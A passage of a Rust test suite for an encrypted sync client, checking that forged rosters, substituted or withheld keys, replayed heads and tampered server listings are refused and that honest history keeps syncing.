    // A fresh, validly signed roster of another account.
    let stranger = Signer::generate()?;
    let mut other = json!({
        "format": 1, "account_id": uuid::Uuid::new_v4().to_string(), "seq": 0,
        "prev_hash": null, "action": "genesis", "created_at": "2026-10-09T00:00:00.000Z",
        "signer_member_id": stranger.id, "members": [stranger.entry("browser")?],
    });
    let bytes = canonical_json(&other).into_bytes();
    let foreign = RosterStatement {
        seq: 0,
        statement: b64::encode(&bytes),
        statement_hash: b64::encode(blake3::hash(&bytes).as_bytes()),
        signature: stranger.sign.sign(ROSTER, &bytes),
    };
    h.world().roster = vec![foreign];
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted another account")?,
        "another account",
    );

    // Same account, but a genesis this computer never trusted.
    other["account_id"] = json!(h.account_id);
    let bytes = canonical_json(&other).into_bytes();
    let mut roster = honest;
    roster[0] = RosterStatement {
        seq: 0,
        statement: b64::encode(&bytes),
        statement_hash: b64::encode(blake3::hash(&bytes).as_bytes()),
        signature: stranger.sign.sign(ROSTER, &bytes),
    };
    h.world().roster = roster;
    expect_roster(
        &h.open(&key).await.err().ok_or("accepted a new genesis")?,
        "genesis differs",
    );
    Ok(())
}

// ---- key envelopes ---------------------------------------------------------------------

fn envelope_index(world: &World, pouch_id: &str, key_gen: u32) -> usize {
    world
        .envelopes
        .iter()
        .position(|e| e.pouch_id == pouch_id && e.key_gen == key_gen)
        .unwrap_or_else(|| panic!("no envelope for generation {key_gen}"))
}

#[tokio::test]
async fn a_withheld_newest_key_generation_is_refused() -> TestResult {
    let h = Harness::new().await?;
    {
        let mut world = h.world();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes.remove(at);
        // …and the server claims generation 1 is the newest.
        world.pouch_key_gen = 1;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("would write with a downgraded key")?,
        "withheld key generation 2",
    );
    Ok(())
}

#[tokio::test]
async fn an_envelope_for_another_recipient_does_not_open() -> TestResult {
    let h = Harness::new().await?;
    let other = Signer::generate()?;
    let recipient = (other.id.as_str(), &other.enc.public_jwk()?);
    let mut envelope = vault::seal_key_envelope(
        (&h.device.id, &h.device.sign),
        recipient,
        &h.pouch_id,
        2,
        &h.material[&2],
    )?;
    // Relabelled for this computer: the signature binds the recipient.
    envelope.member_id = h.device.id.clone();
    {
        let mut world = h.world();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] = envelope;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("used an envelope for someone else")?,
        "withheld key generation 2",
    );
    Ok(())
}

#[tokio::test]
async fn a_substituted_pouch_key_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    let mut fake = h.material[&2];
    fake[..32].copy_from_slice(&[7u8; 32]);
    let key = h.device_key()?;

    // A second, different key for generation 2.
    let substitute =
        vault::seal_key_envelope((&h.device.id, &h.device.sign), me, &h.pouch_id, 2, &fake)?;
    h.world().envelopes.push(substitute.clone());
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted two keys for one generation")?,
        "two different keys",
    );

    // Only the substitute, with an identity secret of its own.
    let mut other_pis = fake;
    other_pis[32..].copy_from_slice(&[9u8; 32]);
    {
        let mut world = h.world();
        world.envelopes.pop();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] = vault::seal_key_envelope(
            (&h.device.id, &h.device.sign),
            me,
            &h.pouch_id,
            2,
            &other_pis,
        )?;
    }
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("accepted a second identity secret")?,
        "two identity secrets",
    );
    Ok(())
}

#[tokio::test]
async fn envelopes_from_removed_members_or_for_unannounced_generations_are_ignored() -> TestResult {
    let h = Harness::new().await?;
    let gone = Signer::generate()?;
    h.add_member(&gone, "device")?;
    h.append(
        &h.device,
        json!({ "action": "remove", "member_id": gone.id }),
    );
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    let mut fake = h.material[&2];
    fake[..32].copy_from_slice(&[7u8; 32]);
    {
        let mut world = h.world();
        // The removed member hands out a key it chose for the newest generation…
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] =
            vault::seal_key_envelope((&gone.id, &gone.sign), me, &h.pouch_id, 2, &fake)?;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("took a key from a removed member")?,
        "withheld key generation 2",
    );

    // …or a member seals a generation 3 no `rotate_keys` ever announced.
    {
        let mut world = h.world();
        world.envelopes = fixture().key_envelopes;
        world.envelopes.push(vault::seal_key_envelope(
            (&h.device.id, &h.device.sign),
            me,
            &h.pouch_id,
            3,
            &fake,
        )?);
    }
    let remote = h.open(&key).await?;
    assert_eq!(remote.keys().key_gen(), 2);
    Ok(())
}

#[tokio::test]
async fn envelopes_from_unknown_members_are_ignored() -> TestResult {
    let h = Harness::new().await?;
    let stranger = Signer::generate()?;
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    {
        let mut world = h.world();
        let at = envelope_index(&world, &h.pouch_id, 2);
        world.envelopes[at] = vault::seal_key_envelope(
            (&stranger.id, &stranger.sign),
            me,
            &h.pouch_id,
            2,
            &h.material[&2],
        )?;
    }
    let key = h.device_key()?;
    expect_roster(
        &h.open(&key)
            .await
            .err()
            .ok_or("took a key from a stranger")?,
        "withheld key generation 2",
    );
    Ok(())
}

#[tokio::test]
async fn a_rotation_the_roster_announces_with_its_envelope_is_followed() -> TestResult {
    let h = Harness::new().await?;
    let me = (h.device.id.as_str(), &h.device.enc.public_jwk()?);
    let mut next = h.material[&2];
    next[..32].copy_from_slice(&[5u8; 32]);
    h.append(
        &h.device,
        json!({ "action": "rotate_keys", "new_generations": { h.pouch_id.clone(): 3 } }),
    );
    {
        let mut world = h.world();
        world.envelopes.push(vault::seal_key_envelope(
            (&h.device.id, &h.device.sign),
            me,
            &h.pouch_id,
            3,
            &next,
        )?);
        world.pouch_key_gen = 3;
    }
    let key = h.device_key()?;
    assert_eq!(h.open(&key).await?.keys().key_gen(), 3);
    Ok(())
}

#[tokio::test]
async fn a_revision_signed_with_a_context_for_something_else_is_refused() -> TestResult {
    tampered_head_is_held(|h, head| {
        // A valid signature by this computer, but over the revision AAD context.
        let envelope =
            b64::decode(head["envelope"].as_str().unwrap_or_default()).unwrap_or_default();
        let id = head["id"].as_str().unwrap_or_default().to_string();
        let message = [
            h.pouch_id.as_bytes(),
            id.as_bytes(),
            blake3::hash(&envelope).as_bytes(),
        ]
        .concat();
        head["signature"] = json!(h.device.sign.sign(REVISION, &message));
    })
    .await
}

// ---- missing items and older heads ---------------------------------------------------

fn expect_rollback(result: SyncResult<engine::Outcome>, key: &str) {
    match result {
        Err(SyncError::Rollback(which)) => assert_eq!(which, key),
        other => panic!("expected a refused rollback of {key}, got {other:?}"),
    }
}

#[tokio::test]
async fn an_item_missing_from_the_listing_is_sent_back_not_deleted() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    // The server lost it (a restored backup, a replica behind) or hides it.
    h.world().artifacts.retain(|a| a["id"] != artifact);

    let outcome = h.sync().await?;
    assert_eq!(outcome.reuploaded, ["skill/pdf"]);
    assert_eq!((outcome.sent, outcome.received), (1, 0));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    // Reuses the original identity so an extant honest tombstone blocks it.
    let head = {
        let world = h.world();
        assert_eq!(world.artifacts.len(), 1);
        world.artifacts[0]["head"].clone()
    };
    let body = h.open_listed(&head)?;
    assert_eq!((body.logical_key.as_str(), body.deleted), ("pdf", false));
    assert_eq!(body.artifact_id, artifact);

    let again = h.sync().await?;
    assert_eq!((again.sent, again.received), (0, 0), "settled");
    Ok(())
}

#[tokio::test]
async fn an_item_with_a_signed_delete_is_removed() -> TestResult {
    let h = Harness::new().await?;
    let other = Signer::generate()?;
    h.add_member(&other, "device")?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    h.edit(
        &other,
        &artifact,
        Edit {
            text: "# PDF\n",
            deleted: true,
            ..Edit::default()
        },
    )?;

    let outcome = h.sync().await?;
    assert_eq!((outcome.sent, outcome.received), (0, 1));
    assert_eq!(h.skill_on_disk("pdf"), None);
    assert!(outcome.reuploaded.is_empty());
    assert_eq!(h.world().commits, 0);
    Ok(())
}

#[tokio::test]
async fn unsigned_deleted_at_does_not_delete_a_live_signed_item() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    {
        let mut world = h.world();
        let item = world
            .artifacts
            .iter_mut()
            .find(|item| item["id"] == artifact)
            .ok_or_else(|| SyncError::Invalid("test artifact missing".into()))?;
        item["deleted_at"] = json!("2026-01-01T00:00:00Z");
    }
    let outcome = h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    assert_eq!((outcome.sent, outcome.received), (0, 0));
    Ok(())
}

#[tokio::test]
async fn verified_head_is_checkpointed_before_blob_download_failure() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# r1\n")?;
    h.sync().await?;
    let r1 = Harness::head_mut(&mut h.world(), &artifact).clone();
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# r2\n",
            ..Edit::default()
        },
    )?;
    h.world().blobs.clear();

    let key = h.device_key()?;
    let remote = h.open(&key).await?;
    let mut state = PouchState::load(&h.home, &h.pouch_id)?;
    let result = engine::sync_with_checkpoint(
        &remote,
        &h.pouch_dir,
        &mut state,
        Options::default(),
        |state| state.save(&h.home, &h.pouch_id),
    )
    .await;
    assert!(
        result.is_err(),
        "the deliberately removed blob should fail download"
    );
    let persisted = PouchState::load(&h.home, &h.pouch_id)?;
    assert_eq!(
        persisted.seen[&artifact].head,
        Harness::head_mut(&mut h.world(), &artifact)["id"]
    );

    *Harness::head_mut(&mut h.world(), &artifact) = r1;
    expect_rollback(h.sync().await, "skill/pdf");
    Ok(())
}

#[tokio::test]
async fn completed_commit_chunk_is_checkpointed_before_next_chunk_fails() -> TestResult {
    let h = Harness::new().await?;
    let mut artifacts = Vec::new();
    for index in 0..21 {
        artifacts.push(h.put_item(&h.device, &format!("item-{index:02}"), "# original\n")?);
    }
    h.sync().await?;
    let initial = PouchState::load(&h.home, &h.pouch_id)?;
    for index in 0..21 {
        std::fs::write(
            h.pouch_dir
                .root()
                .join(format!("skills/item-{index:02}/SKILL.md")),
            "# changed\n",
        )?;
    }
    {
        let mut world = h.world();
        world.fail_commit_on = Some(world.commits + 2);
    }
    let key = h.device_key()?;
    let remote = h.open(&key).await?;
    let mut state = PouchState::load(&h.home, &h.pouch_id)?;
    let result = engine::sync_with_checkpoint(
        &remote,
        &h.pouch_dir,
        &mut state,
        Options::default(),
        |state| state.save(&h.home, &h.pouch_id),
    )
    .await;
    assert!(result.is_err(), "the injected second commit should fail");

    let persisted = PouchState::load(&h.home, &h.pouch_id)?;
    let world = h.world();
    let advanced = artifacts
        .iter()
        .filter(|artifact| {
            let old = &initial.seen[*artifact].head;
            let revision = world
                .artifacts
                .iter()
                .find(|item| item["id"] == **artifact)
                .map(|item| item["head"]["id"].as_str().unwrap_or_default())
                .unwrap_or_default();
            revision != old && persisted.seen[*artifact].head == revision
        })
        .count();
    assert_eq!(
        advanced, 20,
        "the first successful commit chunk must be pinned"
    );
    Ok(())
}

/// A deleted item whose files and history were freed: only its signed
/// delete is left, with no blobs.
fn purge(h: &Harness, artifact: &str, parent_link: bool) {
    let mut world = h.world();
    let head = Harness::head_mut(&mut world, artifact);
    head["blob_ids"] = json!([]);
    if !parent_link {
        // Servers before the link was kept emptied it when the parent went.
        head["parent_id"] = Value::Null;
    }
    world.blobs.clear();
    world
        .history
        .retain(|_, revision| revision["artifact_id"] != artifact);
}

/// A head that can't be shown to follow the last verified one is held:
/// nothing written, deleted or sent for it, and the rest syncs on.
fn expect_held(outcome: engine::Outcome) {
    assert_eq!(outcome.unreadable, 1, "{outcome:?}");
    assert_eq!((outcome.sent, outcome.received), (0, 0), "{outcome:?}");
}

async fn purged_item_is_held_by_a_long_offline_computer(parent_link: bool) -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    let kept = h.put_item(&h.device, "kept", "# Kept\n")?;
    h.sync().await?;
    // While this computer is away: edited elsewhere, deleted, then freed.
    let edit = |text, deleted| Edit {
        text,
        deleted,
        ..Edit::default()
    };
    h.edit(&h.device, &artifact, edit("# PDF v2\n", false))?;
    h.edit(&h.device, &artifact, edit("# PDF v2\n", true))?;
    purge(&h, &artifact, parent_link);

    // Its history is gone, so the delete can't be told from an old one
    // replayed: the local copy stays, and the other item still syncs.
    h.edit(&h.device, &kept, edit("# Kept v2\n", false))?;
    let outcome = h.sync().await?;
    assert_eq!(outcome.unreadable, 1);
    assert_eq!((outcome.sent, outcome.received), (0, 1));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    assert_eq!(h.skill_on_disk("kept").as_deref(), Some("# Kept v2\n"));
    assert_eq!(h.world().commits, 0);
    Ok(())
}

#[tokio::test]
async fn a_purged_item_keeps_its_tombstone_and_is_not_resurrected() -> TestResult {
    purged_item_is_held_by_a_long_offline_computer(true).await
}

#[tokio::test]
async fn a_tombstone_whose_pruned_parent_link_is_empty_still_counts() -> TestResult {
    purged_item_is_held_by_a_long_offline_computer(false).await
}

#[tokio::test]
async fn edits_missed_while_offline_are_followed_through_their_history() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# v1\n")?;
    h.sync().await?;
    for text in ["# v2\n", "# v3\n", "# v4\n"] {
        h.edit(
            &h.device,
            &artifact,
            Edit {
                text,
                ..Edit::default()
            },
        )?;
    }
    let outcome = h.sync().await?;
    assert_eq!((outcome.received, outcome.unreadable), (1, 0));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# v4\n"));
    // A delete after more missed edits removes it too.
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# v5\n",
            ..Edit::default()
        },
    )?;
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# v5\n",
            deleted: true,
            ..Edit::default()
        },
    )?;
    let outcome = h.sync().await?;
    assert_eq!(outcome.unreadable, 0);
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

#[tokio::test]
async fn a_history_revision_of_another_item_does_not_prove_a_chain() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# v1\n")?;
    let other = h.put_item(&h.device, "other", "# other\n")?;
    h.sync().await?;
    let edit = |text| Edit {
        text,
        ..Edit::default()
    };
    h.edit(&h.device, &artifact, edit("# v2\n"))?;
    let v2 = Harness::head_mut(&mut h.world(), &artifact)["id"]
        .as_str()
        .unwrap_or_default()
        .to_string();
    h.edit(&h.device, &artifact, edit("# v3\n"))?;
    // The server answers for v2 with a revision of another item.
    let foreign = Harness::head_mut(&mut h.world(), &other).clone();
    h.world().history.insert(v2, foreign);
    expect_held(h.sync().await?);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# v1\n"));
    Ok(())
}

#[tokio::test]
async fn an_older_head_replayed_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# v1\n")?;
    h.sync().await?;
    let v1 = h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# v2\n",
            ..Edit::default()
        },
    )?;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# v2\n"));
    let agreed = PouchState::load(&h.home, &h.pouch_id)?.items["skill/pdf"].clone();

    // The server serves version 1 again, validly signed as it once was.
    *Harness::head_mut(&mut h.world(), &artifact) = v1;
    expect_rollback(h.sync().await, "skill/pdf");
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# v2\n"));
    assert_eq!(h.world().commits, 0);
    let state = PouchState::load(&h.home, &h.pouch_id)?;
    assert_eq!(state.items["skill/pdf"], agreed, "state moved back");

    // Not even when the pouch's history looks rewritten.
    let mut state = PouchState::load(&h.home, &h.pouch_id)?;
    state.restart();
    state.save(&h.home, &h.pouch_id)?;
    expect_rollback(h.sync().await, "skill/pdf");
    Ok(())
}

#[tokio::test]
async fn the_live_head_of_a_deleted_item_replayed_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    let live = h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# PDF\n",
            deleted: true,
            ..Edit::default()
        },
    )?;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf"), None);

    {
        let mut world = h.world();
        let listed = world
            .artifacts
            .iter_mut()
            .find(|a| a["id"] == artifact)
            .ok_or("no artifact")?;
        listed["head"] = live;
        listed["deleted_at"] = Value::Null;
    }
    expect_rollback(h.sync().await, "skill/pdf");
    assert_eq!(h.skill_on_disk("pdf"), None, "brought a deleted item back");
    Ok(())
}

#[tokio::test]
async fn an_unseen_old_tombstone_cannot_skip_a_pinned_live_head() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# r1\n")?;
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# r1\n",
            deleted: true,
            ..Edit::default()
        },
    )?;
    let r1_tombstone = Harness::head_mut(&mut h.world(), &artifact).clone();
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# r2\n",
            ..Edit::default()
        },
    )?;
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# r3\n",
            ..Edit::default()
        },
    )?;
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# r4\n",
            ..Edit::default()
        },
    )?;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# r4\n"));

    *Harness::head_mut(&mut h.world(), &artifact) = r1_tombstone;
    expect_held(h.sync().await?);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# r4\n"));
    Ok(())
}

#[tokio::test]
async fn a_signed_fork_off_the_pinned_head_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# r1\n")?;
    h.sync().await?;
    let r1 = Harness::head_mut(&mut h.world(), &artifact).clone();
    let r1_id = r1["id"].as_str().ok_or("missing r1 id")?.to_string();
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# r2\n",
            ..Edit::default()
        },
    )?;
    h.sync().await?;

    let fork = h.revision(
        &h.device,
        Revision {
            artifact_id: &artifact,
            parent: Some(&r1_id),
            name: "pdf",
            text: "# fork\n",
            ..Revision::default()
        },
    )?;
    *Harness::head_mut(&mut h.world(), &artifact) = fork;
    expect_held(h.sync().await?);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# r2\n"));
    Ok(())
}

#[tokio::test]
async fn a_new_tombstone_after_epoch_restart_is_accepted() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# r1\n")?;
    h.sync().await?;
    for text in ["# r2\n", "# r3\n", "# r4\n"] {
        h.edit(
            &h.device,
            &artifact,
            Edit {
                text,
                ..Edit::default()
            },
        )?;
        h.sync().await?;
    }
    let mut state = PouchState::load(&h.home, &h.pouch_id)?;
    state.restart();
    state.save(&h.home, &h.pouch_id)?;
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# r4\n",
            deleted: true,
            ..Edit::default()
        },
    )?;
    let outcome = h.sync().await?;
    assert_eq!(outcome.received, 1);
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

#[tokio::test]
async fn honest_history_keeps_syncing() -> TestResult {
    let h = Harness::new().await?;
    let other = Signer::generate()?;
    h.add_member(&other, "device")?;
    let artifact = h.put_item(&h.device, "pdf", "# v1\n")?;
    h.sync().await?;
    let edit = |text| Edit {
        text,
        ..Edit::default()
    };
    h.edit(&other, &artifact, edit("# v2\n"))?;
    h.sync().await?;
    // Restoring version 1 on purpose is a new revision with the old files.
    h.edit(&other, &artifact, edit("# v1\n"))?;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# v1\n"));

    // This computer's own edit, then a conflict resolved with a merge.
    std::fs::write(
        h.pouch_dir.root().join("skills/pdf/SKILL.md"),
        "# v3, from here\n",
    )?;
    assert_eq!(h.sync().await?.sent, 1);
    let ours = Harness::head_mut(&mut h.world(), &artifact)["id"]
        .as_str()
        .unwrap_or_default()
        .to_string();
    let theirs = uuid::Uuid::new_v4().to_string();
    h.edit(
        &other,
        &artifact,
        Edit {
            text: "# merged\n",
            merge_parent: Some(&theirs),
            ..Edit::default()
        },
    )?;
    let outcome = h.sync().await?;
    assert_eq!((outcome.sent, outcome.received), (0, 1));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# merged\n"));
    let seen = &PouchState::load(&h.home, &h.pouch_id)?.seen[&artifact];
    assert!(seen.older.contains(&ours) && seen.older.contains(&theirs));

    // A new computer starts from whatever the server has.
    std::fs::remove_dir_all(h.pouch_dir.root())?;
    std::fs::remove_dir_all(h.home.state_dir().join("sync"))?;
    let outcome = h.sync().await?;
    assert_eq!(outcome.received, 1);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# merged\n"));
    Ok(())
}

fn artifact_ids(h: &Harness) -> Vec<String> {
    h.world()
        .artifacts
        .iter()
        .filter_map(|artifact| artifact["id"].as_str().map(str::to_string))
        .collect()
}

#[tokio::test]
async fn a_delete_of_an_older_item_with_the_same_name_does_not_remove_this_one() -> TestResult {
    let h = Harness::new().await?;
    let old = h.put_item(&h.device, "pdf", "# old\n")?;
    h.edit(
        &h.device,
        &old,
        Edit {
            text: "# old\n",
            deleted: true,
            ..Edit::default()
        },
    )?;
    let new = h.put_item(&h.device, "pdf", "# new\n")?;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# new\n"));
    // The server loses the new item; only the old one's delete is left.
    h.world().artifacts.retain(|a| a["id"] != new);

    let outcome = h.sync().await?;
    assert_eq!(outcome.reuploaded, ["skill/pdf"]);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# new\n"));
    assert!(
        artifact_ids(&h).contains(&new),
        "sent back under its own id"
    );
    Ok(())
}

async fn a_hidden_name_collision_does_not_replace_the_holder(hidden_first: bool) -> TestResult {
    let h = Harness::new().await?;
    let holder = h.put_item(&h.device, "pdf", "# holder\n")?;
    h.sync().await?;
    // Another computer created its own `pdf` meanwhile: the API keeps it
    // hidden (unsigned `deleted_at`) until someone resolves the collision.
    let other = Signer::generate()?;
    h.add_member(&other, "device")?;
    let incoming = h.put_item(&other, "pdf", "# incoming\n")?;
    {
        let mut world = h.world();
        let row = world
            .artifacts
            .iter_mut()
            .find(|a| a["id"] == incoming)
            .ok_or("no incoming")?;
        row["deleted_at"] = json!(NOW);
        if hidden_first {
            world.artifacts.reverse();
        }
    }
    let outcome = h.sync().await?;
    assert_eq!((outcome.sent, outcome.received), (0, 0));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# holder\n"));
    let state = PouchState::load(&h.home, &h.pouch_id)?;
    assert_eq!(state.items["skill/pdf"].artifact_id, holder);
    Ok(())
}

#[tokio::test]
async fn a_hidden_name_collision_listed_after_the_holder_is_left_alone() -> TestResult {
    a_hidden_name_collision_does_not_replace_the_holder(false).await
}

#[tokio::test]
async fn a_hidden_name_collision_listed_before_the_holder_is_left_alone() -> TestResult {
    a_hidden_name_collision_does_not_replace_the_holder(true).await
}

#[tokio::test]
async fn an_item_listed_twice_is_refused_before_anything_changes() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "pdf", "# v1\n")?;
    h.sync().await?;
    let before = PouchState::load(&h.home, &h.pouch_id)?;
    h.world().duplicate_artifact_page = true;
    match h.sync().await {
        Err(SyncError::Invalid(message)) => assert!(message.contains("more than once")),
        other => panic!("expected a refused duplicate listing, got {other:?}"),
    }
    assert_eq!(PouchState::load(&h.home, &h.pouch_id)?, before);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# v1\n"));
    Ok(())
}

#[tokio::test]
async fn sibling_heads_for_one_artifact_are_refused_before_pin_changes() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# base\n")?;
    h.sync().await?;
    let original = h.world().artifacts[0].clone();
    let parent = original["head"]["id"]
        .as_str()
        .ok_or("missing parent")?
        .to_string();
    let first = h.revision(
        &h.device,
        Revision {
            artifact_id: &artifact,
            parent: Some(&parent),
            name: "pdf",
            text: "# first sibling\n",
            ..Revision::default()
        },
    )?;
    let second = h.revision(
        &h.device,
        Revision {
            artifact_id: &artifact,
            parent: Some(&parent),
            name: "pdf",
            text: "# second sibling\n",
            ..Revision::default()
        },
    )?;
    {
        let mut world = h.world();
        let row = world.artifacts.first_mut().ok_or("missing artifact")?;
        row["head"] = first;
        let mut sibling = original;
        sibling["head"] = second;
        world.artifacts.push(sibling);
    }
    let before = PouchState::load(&h.home, &h.pouch_id)?;
    match h.sync().await {
        Err(SyncError::Invalid(message)) => assert!(message.contains("more than once")),
        other => panic!("expected duplicate sibling heads to be refused, got {other:?}"),
    }
    assert_eq!(PouchState::load(&h.home, &h.pouch_id)?, before);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# base\n"));
    Ok(())
}

#[tokio::test]
async fn an_existing_head_and_its_child_listed_twice_are_refused() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# base\n")?;
    h.sync().await?;
    let old_row = h.world().artifacts[0].clone();
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# child\n",
            ..Edit::default()
        },
    )?;
    h.world().artifacts.push(old_row);
    let before = PouchState::load(&h.home, &h.pouch_id)?;
    match h.sync().await {
        Err(SyncError::Invalid(message)) => assert!(message.contains("more than once")),
        other => panic!("expected parent and child listing to be refused, got {other:?}"),
    }
    assert_eq!(PouchState::load(&h.home, &h.pouch_id)?, before);
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# base\n"));
    Ok(())
}

#[tokio::test]
async fn a_head_listed_under_another_item_is_refused() -> TestResult {
    let h = Harness::new().await?;
    let a = h.put_item(&h.device, "a", "# a\n")?;
    let b = h.put_item(&h.device, "b", "# b\n")?;
    h.sync().await?;
    let before = PouchState::load(&h.home, &h.pouch_id)?;
    let a_head = Harness::head_mut(&mut h.world(), &a).clone();
    *Harness::head_mut(&mut h.world(), &b) = a_head;
    match h.sync().await {
        Err(SyncError::Invalid(message)) => assert!(message.contains("signed revision for")),
        other => panic!("expected a refused relabelled head, got {other:?}"),
    }
    assert_eq!(PouchState::load(&h.home, &h.pouch_id)?, before);
    Ok(())
}

#[tokio::test]
async fn a_refused_conflict_upload_keeps_the_local_edit() -> TestResult {
    let h = Harness::new().await?;
    let artifact = h.put_item(&h.device, "pdf", "# v1\n")?;
    h.sync().await?;
    h.edit(
        &h.device,
        &artifact,
        Edit {
            text: "# theirs\n",
            ..Edit::default()
        },
    )?;
    std::fs::write(h.pouch_dir.root().join("skills/pdf/SKILL.md"), "# mine\n")?;
    h.world().reject_operations = true;
    let outcome = h.sync().await?;
    assert_eq!(outcome.rejected.len(), 1, "{outcome:?}");
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# mine\n"));
    Ok(())
}

#[tokio::test]
async fn an_honest_server_keeps_a_withheld_delete_from_being_undone() -> TestResult {
    let h = Harness::new().await?;
    let other = Signer::generate()?;
    h.add_member(&other, "device")?;
    let artifact = h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    let agreement = PouchState::load(&h.home, &h.pouch_id)?.items["skill/pdf"].clone();
    h.edit(
        &other,
        &artifact,
        Edit {
            text: "# PDF\n",
            deleted: true,
            ..Edit::default()
        },
    )?;
    // The listing leaves the deleted item out; the stored delete still
    // makes the API refuse a create under the same id.
    h.world().hide_deleted_from_listing = true;
    let outcome = h.sync().await?;
    assert_eq!(outcome.rejected.len(), 1, "{outcome:?}");
    assert_eq!(
        artifact_ids(&h),
        std::slice::from_ref(&artifact),
        "no item under a new id"
    );
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    assert_eq!(
        PouchState::load(&h.home, &h.pouch_id)?.items["skill/pdf"],
        agreement,
        "a rejected duplicate-ID create must retain the previous agreement"
    );

    // Once the delete is listed, it's applied here.
    h.world().hide_deleted_from_listing = false;
    h.sync().await?;
    assert_eq!(h.skill_on_disk("pdf"), None);
    Ok(())
}

#[tokio::test]
async fn a_deleted_pouch_is_left_alone() -> TestResult {
    let h = Harness::new().await?;
    h.put_item(&h.device, "pdf", "# PDF\n")?;
    h.sync().await?;
    {
        let mut world = h.world();
        world.pouch_state = "deleted".into();
        world.artifacts.clear();
    }
    assert!(matches!(h.sync().await, Err(SyncError::PouchDeleted)));
    assert_eq!(h.skill_on_disk("pdf").as_deref(), Some("# PDF\n"));
    assert_eq!(h.world().commits, 0, "wrote into a deleted pouch");
    Ok(())
}

#[test]
fn the_fixture_device_holds_its_roster_keys() -> TestResult {
    let fixture = fixture();
    let jwk: PublicJwk = SignKey::from_b64(&fixture.sign_key)?.public_jwk()?;
    let welcome = open_welcome(
        &EncKey::from_b64(&fixture.enc_key)?,
        &fixture.member_id,
        &fixture.welcome,
    )?;
    let roster = verify_roster(&fixture.roster, &welcome)?;
    assert_eq!(roster.members[&fixture.member_id].sign_pub, jwk);
    Ok(())
}
